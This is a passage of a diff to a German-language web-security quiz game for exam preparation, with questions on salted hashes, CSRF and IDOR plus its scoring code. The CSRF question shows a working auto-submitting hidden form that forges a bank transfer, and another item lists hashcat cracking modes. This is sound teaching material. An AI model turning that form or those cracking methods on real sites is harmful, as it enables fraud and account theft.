+  '<strong>Szenario:</strong> Eine Datenbank wurde kompromittiert. Der Angreifer findet folgendes:<div class="code-block"><span class="cmt">-- Unsichere Speicherung (MD5, kein Salt):</span>\nhuber  | <span class="bad">ab4f63f9ac65152575886860dde480a1</span>  <span class="cmt">-- "geheim7"</span>\nmueller| <span class="bad">ab4f63f9ac65152575886860dde480a1</span>  <span class="cmt">-- identischer Hash!</span>\n\n<span class="cmt">-- Sichere Speicherung (bcrypt/SHA-256 + Salt):</span>\nhuber  | <span class="str">$2b$10$abc123...xyz  &lt;- Hash(geheim7 + "ba9285aca33f")</span>\nmueller| <span class="str">$2b$10$def456...uvw  &lt;- Hash(geheim7 + "ab2884beabff")</span></div><div class="info-box"><span class="label">Hashcat-Angriffsmodi</span>Brute Force: alle Zeichenkombinationen bis Länge n<br>Dictionary: Wörterliste (rockyou.txt, 14M Einträge)<br>Mask Attack: definiertes Format, z.B. ?u?l?l?l?l?l?d<br>Rule Based: Wörterbuch + Mutationsregeln (Leet-speak etc.)</div>',
+  'Warum schützt ein Salt gegen Rainbow-Table-Angriffe?',
+  [
+    'Ein Salt verschlüsselt den Hash zusätzlich, sodass er ohne das Salt-Passwort nicht entschlüsselt werden kann.',
+    'Ein Salt ist ein zufälliger Wert, der vor dem Hashing an das Passwort angehängt wird. Vorberechnete Rainbow-Tables für das Passwort ohne Salt passen nicht mehr, da der Hash-Input nun einzigartig ist.',
+    'Ein Salt verlängert das Passwort auf mindestens 32 Zeichen, was Brute-Force unmoglich macht.',
+    'Ein Salt ändert den Hashing-Algorithmus dynamisch, sodass Angreifer nicht wissen welchen Algorithmus sie verwenden müssen.'
+  ],
+  1,
+  '<b>Richtig!</b> Ein Salt macht vorberechnete Angriffe wirkungslos:<br><br><b>Ohne Salt:</b> <code>Hash("geheim7")</code> → immer gleich → einmal berechnet, für alle Nutzer nutzbar<br><b>Mit Salt:</b> <code>Hash("geheim7" + "ba9285...")</code> → einzigartiger Hash pro User<br><br>Rainbow Tables enthalten vorberechnete Hashes für Millionen Passwörter – aber ohne den individuellen Salt stimmt kein einziger.<br><br>Gleiche Passwörter ergeben unterschiedliche Hashes → kein erkennbares Muster in der DB.',
+  '<b>Falsch.</b> Salt ist kein Verschlüsselungsschlüssel, verlängert nicht künstlich das Passwort und ändert nicht den Algorithmus. Er macht jeden Hash-Input einzigartig, sodass allgemeine Rainbow-Tables nicht passen.'
+);
+
+addQ(
+  'CSRF',
+  'Cross-Site Request Forgery',
+  '<strong>Szenario:</strong> Du bist eingeloggt bei <code style="color:var(--green)">bank.example.com</code>. Dein Browser hat einen gültigen Session-Cookie. Du klickst auf einen Link in einer E-Mail und landest auf <code style="color:var(--red)">evil.example.com</code>. Dort ist versteckt:<div class="code-block"><span class="cmt">&lt;!-- Unsichtbares Formular auf evil.example.com --&gt;</span>\n&lt;form action=<span class="str">"https://bank.example.com/transfer"</span>\n      method=<span class="str">"POST"</span> id=<span class="str">"csrf"</span>&gt;\n  &lt;input type=<span class="str">"hidden"</span> name=<span class="str">"to"</span>    value=<span class="str">"attacker"</span>&gt;\n  &lt;input type=<span class="str">"hidden"</span> name=<span class="str">"amount"</span> value=<span class="str">"5000"</span>&gt;\n&lt;/form&gt;\n&lt;script&gt;document.getElementById(<span class="str">&#39;csrf&#39;</span>).submit();&lt;/script&gt;</div>',
+  'Warum funktioniert dieser Angriff – und was ist die wichtigste Gegenmaßnahme?',
+  [
+    'Der Angriff funktioniert, weil der Browser automatisch alle Cookies (inkl. Session-Cookie) der Zieldomain mitschickt. Gegenmaßnahme: CSRF-Token – ein serverseitig generierter, zufälliger Wert im Formular, den evil.example.com nicht kennt.',
+    'Der Angriff funktioniert durch SQL Injection in den POST-Parametern. Gegenmaßnahme: Prepared Statements.',
+    'Der Angriff nutzt einen XSS-Fehler auf bank.example.com. Gegenmaßnahme: HTML Entity Encoding.',
+    'Der Browser schickt keine Cookies an andere Domains – der Angriff wäre wirkungslos.'
+  ],
+  0,
+  '<b>Richtig!</b> Das ist CSRF in Reinform:<br><br><b>Warum es funktioniert:</b> Browser senden Cookies einer Domain <em>automatisch</em> mit jedem Request an diese Domain – auch wenn der Request von einer Fremdseite ausgelöst wird. Der Server kann legitime und gefälschte Requests nicht unterscheiden.<br><br><b>CSRF-Token (Synchronizer Token Pattern):</b><br>• Server generiert zufälligen Token pro Session/Request<br>• Token wird im Formular als Hidden-Field eingebettet<br>• Server prüft Token bei POST-Requests<br>• <code>evil.example.com</code> kann diesen Token nicht kennen (Same-Origin-Policy)<br><br>Zusätzlich: <code>SameSite=Strict</code> Cookie-Attribut, Origin-Header-Prüfung.',
+  '<b>Falsch.</b> CSRF ist kein SQL-Injection- oder XSS-Angriff. Browser senden Cookies für eine Domain tatsächlich automatisch mit – das ist das Kernproblem. Die Lösung ist ein CSRF-Token, den der Angreifer nicht replizieren kann.'
+);
+
+addQ(
+  'IDOR & 2FA',
+  'Insecure Direct Object Reference',
+  '<strong>Szenario (real – Telefonica Movistar 2018):</strong> Nach dem Login landet ein Kunde auf:<div class="code-block">https://www.movistar.es/miovistar/movil/privado/<span class="bad">A1B2C3D4</span>/datosPersonales</div>Er ändert die ID in der URL auf <code style="color:var(--red)">A1B2C3D5</code> und sieht die persönlichen Daten eines anderen Kunden (Name, Adresse, Telefon, Rechnungen).<br><br>Millionen Kundendaten waren durch einfaches Inkrementieren der ID abrufbar.<div class="info-box"><span class="label">Zwei-Faktor-Authentifizierung – Kategorien</span><b>Wissen</b> – Passwort, PIN, Sicherheitsfrage<br><b>Besitz</b> – Hardware-Token, Smartphone (TOTP-App, SMS)<br><b>Biometrie</b> – Fingerabdruck, Gesicht, Stimme<br>2FA = mindestens 2 unterschiedliche Kategorien</div>',
+  'Was ist die korrekte Gegenmaßnahme gegen IDOR – und warum schützt 2FA nur begrenzt?',
+  [
+    'Lösung IDOR: IDs durch GUIDs ersetzen, sodass sie nicht erratbar sind. 2FA schützt vollständig, weil ein Angreifer ohne zweiten Faktor keinen Zugriff hat.',
+    'Lösung IDOR: Serverseitige Autorisierungsprüfung bei jedem Zugriff (darf der eingeloggte User diese ID sehen?). 2FA schützt den Login, aber nicht gegen IDOR – nach erfolgreichem Login (auch mit 2FA) kann ein eingeloggter Angreifer trotzdem fremde IDs aufrufen.',
+    'Lösung IDOR: HTTPS erzwingen, sodass IDs nicht im Netzwerk sichtbar sind. 2FA und HTTPS zusammen verhindern IDOR vollständig.',
+    'IDOR ist nur über SQL Injection ausnutzbar – Prepared Statements beheben das Problem.'
+  ],
+  1,
+  '<b>Richtig!</b><br><br><b>IDOR-Gegenmaßnahme:</b> Jede Ressource muss serverseitig auf Berechtigung geprüft werden:<br>• Darf der aktuell eingeloggte User auf Objekt-ID X zugreifen?<br>• GUIDs helfen (schwer erratbar), sind aber kein Ersatz für Autorisierung!<br><br><b>Warum 2FA nicht ausreicht:</b><br>2FA schützt die <em>Authentifizierung</em> (Login). Sobald ein Nutzer (legitim oder Angreifer) eingeloggt ist, ist IDOR ein <em>Autorisierungs</em>-Problem. Ein böswilliger Nutzer mit gültigem Account (+ 2FA) kann IDOR trotzdem ausnutzen.',
+  '<b>Falsch.</b> GUIDs allein sind kein Autorisierungsersatz (Security through Obscurity). HTTPS verhindert kein IDOR. IDOR hat nichts mit SQL Injection zu tun. Die einzige echte Lösung ist serverseitige Berechtigungsprüfung per Zugriff.'
+);
+
+// ─── GAME STATE ──────────────────────────────────────────────────────────────
+var cur = 0, score = 0, total = 0;
+var results = []; // true/false per question
+
+function buildProgress() {
+  var t = document.getElementById('progress-track');
+  t.innerHTML = '';
+  Q.forEach(function(_, i) {
+    var d = document.createElement('div');
+    d.className = 'prog-seg';
+    d.id = 'seg-' + i;
+    t.appendChild(d);
+  });
+}
+
+function updateProgress(idx) {
+  Q.forEach(function(_, i) {
+    var d = document.getElementById('seg-' + i);
+    if (!d) return;
+    d.className = 'prog-seg' + (i < idx ? ' done' : i === idx ? ' active' : '');
+  });
+  document.getElementById('score-display').textContent =
+    'PUNKTE: ' + score + ' / ' + (idx * 10);
+}
+
+function showScene(idx) {
+  if (idx >= Q.length) { showEnd(); return; }
+  var q = Q[idx];
+
+  document.getElementById('game-area').style.display = 'block';
+  document.getElementById('start-screen').style.display = 'none';
+  document.getElementById('end-screen').style.display = 'none';
+
+  document.getElementById('card-tag').textContent = q.tag;
+  document.getElementById('card-num').textContent = (idx + 1) + ' / ' + Q.length;
+  document.getElementById('scenario-title').textContent = q.title;
+  document.getElementById('scenario-text').innerHTML = q.scenario;
+  document.getElementById('question-text').innerHTML = q.question;
+
+  var ch = document.getElementById('choices');
+  ch.innerHTML = '';
+  var keys = ['A', 'B', 'C', 'D'];
+  q.choices.forEach(function(text, i) {
+    var btn = document.createElement('button');
+    btn.className = 'choice';
+    btn.innerHTML = '<span class="choice-key">' + keys[i] + '</span><span>' + text + '</span>';
+    btn.onclick = function() { handleChoice(i, btn); };
+    ch.appendChild(btn);
+  });
+
+  var fb = document.getElementById('feedback');
+  fb.style.display = 'none';
+  document.getElementById('next-btn').style.display = 'none';
+  document.getElementById('retry-btn').style.display = 'none';
+
+  updateProgress(idx);
+
+  // Re-animate card
+  var card = document.getElementById('scene-card');
+  card.style.animation = 'none';
+  void card.offsetWidth;
+  card.style.animation = 'slideIn .35s cubic-bezier(.22,1,.36,1)';
+
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function handleChoice(idx, btn) {
+  var q = Q[cur];
+  document.querySelectorAll('.choice').forEach(function(b) {
+    b.disabled = true;
+    b.classList.add('dim');
+  });
+
+  var fb = document.getElementById('feedback');
+  fb.style.display = 'block';
+  fb.style.animation = 'none'; void fb.offsetWidth; fb.style.animation = 'slideIn .3s ease';
+
+  var isCorrect = (idx === q.correctIdx);
+  if (isCorrect) {
+    score += 10; total += 10;
+    btn.classList.remove('dim'); btn.classList.add('correct');
+    fb.className = 'correct';
+    document.getElementById('feedback-head').textContent = 'KORREKT  +10 Punkte';
+    document.getElementById('feedback-body').innerHTML = q.fb_ok;
+    document.getElementById('next-btn').style.display = 'inline-block';
+    results[cur] = true;
+  } else {
+    total += 10;
+    btn.classList.remove('dim'); btn.classList.add('wrong');
+    // highlight correct
+    document.querySelectorAll('.choice')[q.correctIdx].classList.remove('dim');
+    document.querySelectorAll('.choice')[q.correctIdx].classList.add('correct');
+    fb.className = 'wrong';
+    document.getElementById('feedback-head').textContent = 'FALSCH  -0 Punkte';
+    document.getElementById('feedback-body').innerHTML = q.fb_fail;
+    document.getElementById('retry-btn').style.display = 'inline-block';
+    results[cur] = false;
+  }
+
+  document.getElementById('score-display').textContent =
+    'PUNKTE: ' + score + ' / ' + total;
+
+  fb.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+}
+
+function nextScene() { cur++; showScene(cur); }
+
+function retryScene() {
+  results[cur] = false; // mark as failed even on retry
+  showScene(cur);
+}
+
+function showEnd() {
+  document.getElementById('game-area').style.display = 'none';
+  document.getElementById('end-screen').style.display = 'block';
+  updateProgress(Q.length);
+
+  document.getElementById('end-val').textContent = score;
+  document.getElementById('end-max').textContent = '/ ' + (Q.length * 10) + ' Pts';
+
+  var pct = score / (Q.length * 10);
+  var msg = '';
+  if (pct >= 0.9) msg = 'Exzellent! Du bist bereit fuer die Klausur.';
+  else if (pct >= 0.7) msg = 'Gut! Kleinere Luecken – nochmal die markierten Themen wiederholen.';
+  else if (pct >= 0.5) msg = 'Ausreichend. Die roten Themen unbedingt nochmal im Skript nachlesen.';
+  else msg = 'Viel Nachholbedarf – geh die OWASP Top 10 und das Skript gruendlich durch.';
+  document.getElementById('end-verdict').textContent = msg;
+
+  var grid = document.getElementById('review-grid');
+  grid.innerHTML = '';
+  Q.forEach(function(q, i) {
+    var d = document.createElement('div');
+    d.className = 'review-pill ' + (results[i] ? 'ok' : 'bad');
+    d.innerHTML = (results[i] ? '&#10003; ' : '&#10007; ') + q.tag;
+    grid.appendChild(d);
+  });
+}
+
+function startGame() {
+  cur = 0; score = 0; total = 0; results = [];
+  buildProgress();
+  showScene(0);
+}
+</script>
+</body>
+</html>
